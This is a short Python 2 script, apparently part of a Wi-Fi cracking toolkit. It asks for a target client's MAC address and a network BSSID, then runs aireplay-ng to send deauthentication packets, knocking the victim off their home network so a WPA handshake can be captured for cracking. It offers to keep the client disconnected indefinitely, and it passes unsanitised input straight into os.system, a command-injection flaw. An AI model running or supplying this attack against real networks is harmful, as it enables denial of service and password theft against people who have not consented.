#! /usr/bin/python
# -*- coding: utf-8 -*-
 """
 This is another small script used to deauthenficate a client from his network
 so when he re-connect a handshake will be captured in the running airodump-ng
 script.
 author: https://github.com/yelhamer
 """
from os import system
from termcolor import colored
from time import sleep

print colored("Wait for a client to connect to his home network that you are attacking, and then", "green")
client_mac_address = raw_input("Copy his mac address and print it here:")
bssid = raw_input("Now re-enter the bssid of the wireless network:")
number_of_deauth_packets = raw_input("""How many deauth packet you want to be sent?
 (0 will put no limit and will keep the client deauthenficated until you hit Ctrl+C, we suggest that you use 2 or 4):""")
wireless_card = raw_input("enter the wireless card that you previously used:")

send_deauth = 'aireplay-ng -0 {0} -a {1} -c {2} {3}'.format(number_of_deauth_packets,
                                                            bssid,
                                                            client_mac_address,
                                                            wireless_card)
system(send_deauth)

reply = 'Thanks, We will kick the client out of his network so when he connect back we will capture the handshake he made with the router, after we tell you this is done wait about 10 seconds and a message should appear on the first terminal telling you: WPA Handshake: {0} ,in nothing appeared proceed try deauthenticating another client'.format(bssid)
answer = raw_input("Have the handshake been captured? [Y]es/[N]o:")
if answer.upper() == 'Y':
    print colored("Hit Ctrl+C on the first terminal to proceed", "green")
    sleep( 10 )
    exit()
else:
    system(send_deauth)
